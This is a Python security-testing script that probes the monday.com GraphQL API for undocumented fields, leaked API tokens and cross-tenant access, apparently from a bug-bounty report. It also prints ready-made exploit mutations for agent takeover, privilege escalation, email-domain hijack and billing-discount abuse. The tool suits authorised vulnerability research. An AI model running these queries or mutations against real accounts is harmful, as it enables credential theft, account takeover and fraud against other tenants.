#!/usr/bin/env python3
"""
gqlprobe - run the read-only checks from reports/graphql-findings.md against
the monday.com GraphQL API.

    export MONDAY_TOKEN='<your api token>'
    python3 gqlprobe.py whoami          # sanity-check the token, print your ids
    python3 gqlprobe.py probe           # GQL-05: which hidden fields actually exist
    python3 gqlprobe.py checks          # GQL-02, GQL-03, GQL-10 on your own account
    python3 gqlprobe.py all

Cross-tenant (the only way to prove a real finding) needs a second account:

    export MONDAY_TOKEN_B='<token of account B>'
    python3 gqlprobe.py crosstenant --b-account 123 --b-user 456 --b-board 789

READ-ONLY BY DESIGN. This tool sends queries, never mutations. The mutation-based
findings (GQL-06 agent takeover, GQL-07 user admin, GQL-09 billing) change state,
so `mutations` only PRINTS them for you to run deliberately against your own
accounts. Nothing here deletes, revokes, or modifies anything.

Token: avatar -> Developer -> My Access Tokens. Sent as `Authorization: <token>`
(no "Bearer" prefix).
"""

import argparse
import json
import os
import sys
import time
import urllib.error
import urllib.request

API = "https://api.monday.com/v2"

C_R = "\033[31m"; C_G = "\033[32m"; C_Y = "\033[33m"
C_B = "\033[1m"; C_D = "\033[2m"; C_0 = "\033[0m"


# --------------------------------------------------------------------------- #
# transport
# --------------------------------------------------------------------------- #

def gql(query, token, variables=None, timeout=30, api_version=None):
    """POST a document. Returns (http_status, parsed_json_or_None, raw_text)."""
    payload = {"query": query}
    if variables:
        payload["variables"] = variables
    headers = {
        "Authorization": token,
        "Content-Type": "application/json",
        "Accept": "application/json",
    }
    if api_version:
        headers["API-Version"] = api_version
    req = urllib.request.Request(API, data=json.dumps(payload).encode(),
                                 headers=headers, method="POST")
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            raw = r.read().decode("utf-8", "replace")
            status = r.status
    except urllib.error.HTTPError as e:
        raw = e.read().decode("utf-8", "replace")
        status = e.code
    except Exception as e:                                        # noqa: BLE001
        return 0, None, f"transport error: {e}"
    try:
        return status, json.loads(raw), raw
    except json.JSONDecodeError:
        return status, None, raw


def errors_of(body):
    """monday returns errors in a few shapes; normalise to a list of strings."""
    if not isinstance(body, dict):
        return []
    out = []
    for e in body.get("errors") or []:
        if isinstance(e, dict):
            out.append(str(e.get("message", e)))
        else:
            out.append(str(e))
    for k in ("error_message", "errorMessage", "error"):
        if body.get(k):
            out.append(str(body[k]))
    return out


def has_data(body):
    d = (body or {}).get("data")
    if not isinstance(d, dict):
        return False
    return any(v is not None for v in d.values())


# --------------------------------------------------------------------------- #
# the classification that makes GQL-05 work
# --------------------------------------------------------------------------- #

ABSENT_MARKERS = (
    "cannot query field",
    "doesn't exist on type",
    "does not exist on type",
    "undefined field",
    "unknown field",
)

RATELIMIT_MARKERS = ("complexity budget", "rate limit", "too many requests",
                     "depth limit", "ratelimit")

# The token itself is bad - nothing was evaluated.
TOKEN_AUTH_MARKERS = ("not authenticated", "invalid token", "authentication required",
                      "please authenticate", "missing authorization")

# The field WAS reached and then refused. That means it exists.
FIELD_DENY_MARKERS = ("unauthorized", "unauthorised", "permission", "not allowed",
                      "forbidden", "admin", "access denied", "not permitted")


def classify(status, body, raw):
    """
    ABSENT     - not in the schema. Clean negative.
    EXISTS     - resolved and returned data. Hidden surface, confirmed.
    DENIED     - resolved far enough to refuse you. The field EXISTS and is
                 permission-gated: the strongest signal short of data.
    EXISTS?    - some other error (arguments, types). The field is there; the
                 probe was malformed. Fix the probe and retry.
    RATELIMIT / AUTH / HTTP - environmental.

    The AUTH-vs-DENIED split matters: a per-field authorisation refusal is a
    hit, not a token problem, and collapsing the two hides exactly the result
    this tool exists to find.
    """
    errs = errors_of(body)
    joined = " ".join(errs).lower()

    if status == 0:
        return "HTTP", raw[:160]
    if status in (401, 403):
        return "AUTH", errs[0] if errs else f"HTTP {status}"
    if status == 429 or any(m in joined for m in RATELIMIT_MARKERS):
        return "RATELIMIT", errs[0] if errs else f"HTTP {status}"
    if any(m in joined for m in TOKEN_AUTH_MARKERS):
        return "AUTH", errs[0]

    if errs and any(m in joined for m in ABSENT_MARKERS):
        return "ABSENT", errs[0]
    if has_data(body):
        return "EXISTS", "returned data"
    if errs and any(m in joined for m in FIELD_DENY_MARKERS):
        return "DENIED", errs[0]
    if errs:
        return "EXISTS?", errs[0]
    if status != 200:
        return "HTTP", f"HTTP {status}: {raw[:120]}"
    return "EMPTY", "200, data present but all null"


def show(label, verdict, detail, extra=""):
    colour = {"EXISTS": C_R, "DENIED": C_R, "EXISTS?": C_Y, "ABSENT": C_D,
              "RATELIMIT": C_Y, "AUTH": C_Y}.get(verdict, "")
    print(f"  {colour}{verdict:<9}{C_0} {label}")
    if detail:
        print(f"            {C_D}{str(detail)[:180]}{C_0}")
    if extra:
        print(f"            {extra}")


# --------------------------------------------------------------------------- #
# GQL-05: hidden namespaces
# --------------------------------------------------------------------------- #

PROBES = [
    # the five SearchNamespace result types with no published root field
    ("search.updates (private comments)",
     '{ search { updates(query: "a") { results { id indexed_data { body board_id } } } } }'),
    ("search.users (emails)",
     '{ search { users(query: "a") { results { id indexed_data { name email } } } } }'),
    ("search.meetings (transcripts, attendees)",
     '{ search { meetings(query: "a") { results { id indexed_data { title summary attendee_emails } } } } }'),
    ("search.timeline_items (email to/from/cc)",
     '{ search { timeline_items(query: "a") { results { id indexed_data { title content } } } } }'),
    ("search.overviews",
     '{ search { overviews(query: "a") { results { id indexed_data { name } } } } }'),

    # orphaned namespaces, guessed root-field names
    ("vibe (AI app builder)", "{ vibe { apps { id name } } }"),
    ("vibe.apps as_admin", "{ vibe { apps(as_admin: true) { id name } } }"),
    ("intelligence", "{ intelligence { context { user { id email } account { id name } } } }"),
    ("intelligence.assigned_boards", "{ intelligence { assigned_boards { board_id } } }"),
    ("lookup", '{ lookup { boards(query: "a") { results { id } } } }'),

    # GQL-04 - the type documented as skipping authorization
    ("activity_log_internal", "{ activity_log_internal { logs { logs { id event } } } }"),
    ("activity_logs_internal", "{ activity_logs_internal { logs { logs { id event } } } }"),
    ("internal_activity_log", "{ internal_activity_log { logs { logs { id event } } } }"),
    ("activity_log", "{ activity_log { logs { logs { id event } } } }"),
    ("activity_logs", "{ activity_logs { logs { logs { id event } } } }"),

    # other orphans
    ("my_tasks", "{ my_tasks { task_board_id } }"),
    ("user_permits", "{ user_permits { account { scope_id } } }"),
    ("automations", "{ automations { items { id title } } }"),
    ("board_automations", "{ board_automations { items { id title } } }"),
    ("workflows / live_workflows", "{ live_workflows { data { id title } } }"),
    ("blocks (automation blocks)", "{ blocks { blocks { id name uniqueKey } } }"),
    ("remote_options", '{ remote_options(input: {field_type_unique_key: "a"}) { options { title } } }'),
    ("agent_activity_runs", "{ agent_activity_runs { nodes { id status } } }"),
    ("resources_availability", "{ resources_availability { default_work_schedule_id } }"),
    ("work_schedules", "{ work_schedules { work_schedules { id name } } }"),
    ("snapshottable_workspaces", "{ snapshottable_workspaces { id name } }"),
    ("data_views", "{ data_views { id name } }"),
    ("messages (chat)", '{ messages(channel_id: "1") { messages { id } } }'),
    ("dashboard_data", '{ dashboard_data(dashboard_id: "1") { dashboard_id } }'),
    ("widgets_surface", "{ widgets_surface { id version } }"),
    ("artifacts", "{ artifacts { id state } }"),
    ("suggested_agents", "{ suggested_agents { title seed_prompt } }"),
    ("solutions", "{ solutions { id title } }"),
    ("portfolio_utilization_report", "{ portfolio_resources { id name } }"),
]


def cmd_probe(args):
    print(f"\n{C_B}=== GQL-05: which hidden fields exist ==={C_0}")
    print(f"{C_D}  ABSENT   = not in the schema, clean negative")
    print(f"  EXISTS   = resolved and returned data - hidden surface, confirmed")
    print(f"  DENIED   = refused you by permission - the field EXISTS and is gated")
    print(f"  EXISTS?  = some other error - the field is there, the probe was")
    print(f"             malformed. All three non-ABSENT buckets are hits.{C_0}\n")

    tally = {}
    interesting = []
    for label, q in PROBES:
        st, body, raw = gql(q, args.token, timeout=args.timeout)
        verdict, detail = classify(st, body, raw)
        tally[verdict] = tally.get(verdict, 0) + 1
        show(label, verdict, detail)
        if verdict in ("EXISTS", "DENIED", "EXISTS?"):
            interesting.append((label, q, verdict, detail))
        if verdict == "RATELIMIT":
            print(f"  {C_Y}backing off {args.delay * 6}s{C_0}")
            time.sleep(args.delay * 6)
        time.sleep(args.delay)

    print(f"\n{C_B}--- summary ---{C_0}")
    for k in ("EXISTS", "DENIED", "EXISTS?", "ABSENT", "RATELIMIT", "AUTH",
              "HTTP", "EMPTY"):
        if tally.get(k):
            print(f"  {k:<9} {tally[k]}")
    if interesting:
        print(f"\n{C_B}Fields that are NOT absent - follow these up:{C_0}")
        for label, q, verdict, detail in interesting:
            print(f"\n  [{verdict}] {label}")
            print(f"  {C_D}{q}{C_0}")
            print(f"  -> {detail}")
        print(f"\n  For each: does it return data from OTHER accounts? That is the finding.")
    else:
        print(f"\n  {C_G}Every probe came back ABSENT - the published SDL matches the")
        print(f"  live root fields. Move on to GQL-01 / GQL-02.{C_0}")
    return interesting


# --------------------------------------------------------------------------- #
# read-only checks on your own account
# --------------------------------------------------------------------------- #

def cmd_whoami(args):
    print(f"\n{C_B}=== token check + your ids ==={C_0}")
    q = """{ me { id name email is_admin account { id slug name tier } }
             complexity { before after query reset_in_x_seconds } }"""
    st, body, raw = gql(q, args.token, timeout=args.timeout)
    if st != 200 or not has_data(body):
        print(f"  {C_R}token not working{C_0}: HTTP {st} {errors_of(body) or raw[:200]}")
        return None
    me = body["data"]["me"]
    acct = me.get("account") or {}
    print(f"  user_id     {me.get('id')}   {me.get('name')}  <{me.get('email')}>")
    print(f"  is_admin    {me.get('is_admin')}")
    print(f"  account_id  {acct.get('id')}   slug={acct.get('slug')}  tier={acct.get('tier')}")
    cx = (body["data"].get("complexity") or {})
    if cx:
        print(f"  complexity  {cx.get('after')}/{cx.get('before')} left, "
              f"resets in {cx.get('reset_in_x_seconds')}s")
    print(f"\n  {C_Y}Note: if is_admin is true, a successful admin-only call proves nothing.")
    print(f"  Re-run the checks as a plain MEMBER to test authorisation properly.{C_0}")
    return me


def cmd_checks(args):
    print(f"\n{C_B}=== read-only checks on your own account ==={C_0}")

    # GQL-10 - per-user credential field
    print(f"\n{C_B}GQL-10  User.encrypt_api_token{C_0}")
    for label, q in [
        ("top level users()",
         "{ users(limit: 5) { id name email encrypt_api_token } }"),
        ("nested via board subscribers",
         "{ boards(limit: 1) { id subscribers { id name encrypt_api_token } } }"),
    ]:
        st, body, raw = gql(q, args.token, timeout=args.timeout)
        verdict, detail = classify(st, body, raw)
        leaked = []
        if verdict == "EXISTS":
            blob = json.dumps(body)
            users = (body.get("data", {}).get("users")
                     or [u for b in (body.get("data", {}).get("boards") or [])
                         for u in (b.get("subscribers") or [])])
            leaked = [u for u in users if u.get("encrypt_api_token")]
        show(label, verdict, detail,
             extra=(f"{C_R}!! {len(leaked)} user(s) returned a token{C_0}" if leaked else
                    "field resolved but every token was null" if verdict == "EXISTS" else ""))
        time.sleep(args.delay)

    # GQL-02 - service users and their tokens
    print(f"\n{C_B}GQL-02  service users / tokens{C_0}")
    st, body, raw = gql("{ service_users { id name enabled has_token last_token_activity } }",
                        args.token, timeout=args.timeout)
    verdict, detail = classify(st, body, raw)
    show("service_users", verdict, detail)
    ids = [str(u["id"]) for u in (body.get("data", {}).get("service_users") or [])
           if u.get("id")] if verdict == "EXISTS" else []
    time.sleep(args.delay)
    if ids:
        print(f"            found {len(ids)}: {', '.join(ids[:8])}")
        q = ('{ service_user_tokens(service_user_ids: ["%s"]) { service_user_id token } }'
             % ids[0])
        st, body, raw = gql(q, args.token, timeout=args.timeout)
        verdict, detail = classify(st, body, raw)
        toks = [t for t in (body.get("data", {}).get("service_user_tokens") or [])
                if t.get("token")] if verdict == "EXISTS" else []
        show("service_user_tokens (own account)", verdict, detail,
             extra=(f"{C_R}!! returned {len(toks)} token(s){C_0}" if toks else ""))
        if toks:
            print(f"            {C_Y}If you are NOT an admin, this is the finding."
                  f" Re-check is_admin above.{C_0}")
        time.sleep(args.delay)
    else:
        print(f"            {C_D}no service users on this account - create one in"
              f" Admin -> API, or test on an account that has them{C_0}")

    # GQL-03 - the documented secret header
    print(f"\n{C_B}GQL-03  export_events without X-Tool-Execution-Secret{C_0}")
    q = ('{ export_events(limit: 1) { total events { id type board_id created_at } } }')
    st, body, raw = gql(q, args.token, timeout=args.timeout)
    verdict, detail = classify(st, body, raw)
    show("export_events (no secret header)", verdict, detail,
         extra=(f"{C_R}!! resolved without the documented header{C_0}"
                if verdict == "EXISTS" else ""))
    time.sleep(args.delay)

    # audit logs - admin gating
    print(f"\n{C_B}Tier C  audit_logs (should be admin-only){C_0}")
    q = "{ audit_logs(limit: 2) { logs { timestamp event ip_address user_agent } } }"
    st, body, raw = gql(q, args.token, timeout=args.timeout)
    verdict, detail = classify(st, body, raw)
    show("audit_logs", verdict, detail,
         extra=(f"{C_Y}check whether your user is an admin{C_0}" if verdict == "EXISTS" else ""))


# --------------------------------------------------------------------------- #
# the part that actually proves a bug
# --------------------------------------------------------------------------- #

def cmd_crosstenant(args):
    print(f"\n{C_B}=== cross-tenant: token A against account B ==={C_0}")
    if not (args.b_account and args.b_user and args.b_board):
        print(f"  {C_R}need --b-account, --b-user and --b-board{C_0}")
        print(f"  {C_D}get them by running `whoami` with MONDAY_TOKEN_B set,")
        print(f"  and a board id from account B's URL{C_0}")
        return
    print(f"  {C_D}token A -> account_id={args.b_account} user_id={args.b_user}"
          f" board_id={args.b_board}{C_0}\n")

    # GQL-01 - the headline
    print(f"{C_B}GQL-01  dependency_column_config with B's ids{C_0}")
    q = ('{ dependency_column_config(board_id: "%s", account_id: "%s", user_id: "%s") '
         '{ board_id dependency_columns { id account_id board_id data } } }'
         % (args.b_board, args.b_account, args.b_user))
    st, body, raw = gql(q, args.token, timeout=args.timeout)
    verdict, detail = classify(st, body, raw)
    show("cross-tenant dependency_column_config", verdict, detail)
    if verdict == "EXISTS":
        print(f"  {C_R}{C_B}!! CONFIRMED: account A's token read account B's board config.{C_0}")
        print(f"  {C_R}   Authentication is taken from the arguments. Report this.{C_0}")
        print(json.dumps(body.get("data"), indent=2)[:900])
    time.sleep(args.delay)

    # the mismatch variant: your own board, someone else's identity
    print(f"\n{C_B}GQL-01b  your board id + B's account/user (argument mismatch){C_0}")
    if args.a_board:
        q = ('{ dependency_column_config(board_id: "%s", account_id: "%s", user_id: "%s") '
             '{ board_id dependency_columns { id } } }'
             % (args.a_board, args.b_account, args.b_user))
        st, body, raw = gql(q, args.token, timeout=args.timeout)
        verdict, detail = classify(st, body, raw)
        show("mismatched identity args", verdict, detail,
             extra=(f"{C_R}!! args are not validated against the token{C_0}"
                    if verdict == "EXISTS" else ""))
        time.sleep(args.delay)
    else:
        print(f"  {C_D}pass --a-board to run this one{C_0}")

    # GQL-02 cross-tenant
    print(f"\n{C_B}GQL-02  service_user_tokens for B's service users{C_0}")
    if args.b_service_user:
        q = ('{ service_user_tokens(service_user_ids: ["%s"]) '
             '{ service_user_id token } }' % args.b_service_user)
        st, body, raw = gql(q, args.token, timeout=args.timeout)
        verdict, detail = classify(st, body, raw)
        toks = [t for t in (body.get("data", {}).get("service_user_tokens") or [])
                if t.get("token")] if verdict == "EXISTS" else []
        show("cross-tenant service_user_tokens", verdict, detail,
             extra=(f"{C_R}{C_B}!! CONFIRMED: another account's API token{C_0}"
                    if toks else ""))
        time.sleep(args.delay)
    else:
        print(f"  {C_D}pass --b-service-user (get it from `service_users` on token B){C_0}")

    # search index tenant isolation - only meaningful if the probes found the fields
    print(f"\n{C_B}GQL-05  does the search index leak across tenants{C_0}")
    print(f"  {C_D}run `probe` with token A, then search for a string that exists ONLY")
    print(f"  in account B. A hit is a cross-tenant index leak.{C_0}")


def cmd_mutations(args):
    """Print, never send."""
    print(f"\n{C_B}=== state-changing checks - RUN THESE BY HAND ==={C_0}")
    print(f"{C_Y}Not sent automatically: they modify accounts. Run each against your")
    print(f"OWN accounts first so you know what success looks like.{C_0}\n")

    blocks = [
        ("GQL-06  agent takeover via optional agent_id",
         "Repoint another agent's callback_url; the response hands back its new signing_secret.",
         'mutation {\n'
         '  update_custom_agent(input: {\n'
         '    agent_id: "<AGENT NOT YOURS>",\n'
         '    callback_url: "https://your-collaborator.example/hook"\n'
         '  }) { success signing_secret }\n'
         '}'),
        ("GQL-07  privilege escalation / email domain",
         "Run as a plain MEMBER. Admin success proves nothing.",
         'mutation { update_users_role(user_ids: ["<SELF>"], new_role: ADMIN)\n'
         '  { updated_users { id kind } errors { code message } } }\n\n'
         'mutation { update_email_domain(input: {\n'
         '    user_ids: ["<OTHER USER>"], new_domain: "yourdomain.example"\n'
         '  }) { updated_users { id email } errors { code message } } }\n\n'
         'mutation { update_multiple_users(\n'
         '    user_updates: [{ user_id: "<OTHER>", user_attribute_updates: '
         '{ email: "you@yourdomain.example" } }],\n'
         '    bypass_confirmation_for_claimed_domains: true\n'
         '  ) { updated_users { id email } errors { code message } } }'),
        ("GQL-09  billing: discount on an account you do not own",
         "Slugs are public - they are in every monday URL. Try 100, >100, and negative.",
         'mutation { grant_marketplace_app_discount(\n'
         '    app_id: "<APP>", account_slug: "<SOMEONE ELSE>",\n'
         '    data: { days_valid: 365, discount: 100, is_recurring: true,\n'
         '            period: MONTHLY, app_plan_ids: ["<PLAN>"] }\n'
         '  ) { granted_discount { discount app_id } } }\n\n'
         'mutation { batch_extend_trial_period(\n'
         '    account_slugs: ["<SOMEONE ELSE>"], app_id: "<APP>",\n'
         '    duration_in_days: 365, plan_id: "<PLAN>"\n'
         '  ) { success details { account_slug success reason } } }'),
        ("GQL-09b  mocked subscription (partial-secret gate)",
         "Gated only on the last 10 chars of a signing secret. Use your own app first.",
         'mutation { set_mock_app_subscription(\n'
         '    app_id: "<YOUR APP>", partial_signing_secret: "<LAST 10>",\n'
         '    plan_id: "<PAID PLAN>", is_trial: false, max_units: 999\n'
         '  ) { plan_id is_trial max_units renewal_date } }'),
    ]
    for title, why, q in blocks:
        print(f"{C_B}{title}{C_0}")
        print(f"  {C_D}{why}{C_0}")
        for line in q.split("\n"):
            print(f"  {line}")
        print()

    print(f"{C_R}Never run against accounts you do not own: delete_object,")
    print(f"bulk_delete_items, revoke_service_user_tokens, delete_board.{C_0}")


# --------------------------------------------------------------------------- #

def main():
    ap = argparse.ArgumentParser(description=__doc__,
                                 formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("command",
                    choices=["whoami", "probe", "checks", "crosstenant", "mutations", "all"])
    ap.add_argument("--token", default=os.environ.get("MONDAY_TOKEN"))
    ap.add_argument("--delay", type=float, default=1.0,
                    help="seconds between requests (default 1)")
    ap.add_argument("--timeout", type=float, default=30)
    ap.add_argument("--b-account"), ap.add_argument("--b-user")
    ap.add_argument("--b-board"), ap.add_argument("--a-board")
    ap.add_argument("--b-service-user")
    args = ap.parse_args()

    if args.command == "mutations":
        cmd_mutations(args)
        return
    if not args.token:
        print(f"{C_R}no token.{C_0} export MONDAY_TOKEN='<token>' "
              f"(avatar -> Developer -> My Access Tokens)", file=sys.stderr)
        sys.exit(2)

    if args.command in ("whoami", "all", "checks", "crosstenant"):
        if cmd_whoami(args) is None and args.command != "whoami":
            sys.exit(1)
    if args.command in ("probe", "all"):
        cmd_probe(args)
    if args.command in ("checks", "all"):
        cmd_checks(args)
    if args.command == "crosstenant":
        cmd_crosstenant(args)
    if args.command == "all":
        print(f"\n{C_B}Next: `crosstenant` with a second account - that is what turns")
        print(f"any of this into a reportable finding.{C_0}")


if __name__ == "__main__":
    main()
